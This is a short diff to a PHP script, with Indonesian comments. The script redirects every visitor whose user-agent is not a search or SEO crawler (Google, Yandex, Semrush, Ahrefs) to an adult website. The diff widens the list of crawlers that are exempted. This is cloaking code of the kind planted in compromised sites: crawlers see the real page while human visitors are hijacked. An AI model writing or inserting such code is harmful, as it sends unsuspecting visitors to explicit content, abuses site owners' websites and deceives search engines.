@@ -2,8 +2,8 @@
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-    // Jika user-agent TIDAK mengandung 'google' (case-insensitive)
-    if (!preg_match('/google/i', $user_agent)) {
+    // Jika user-agent TIDAK mengandung 'google', 'yandex', 'semrush', ATAU 'ahrefs'
+    if (!preg_match('/google|yandex|semrush|ahrefs/i', $user_agent)) {
         header('Location: https://javpornsub.net');
         exit;
     }
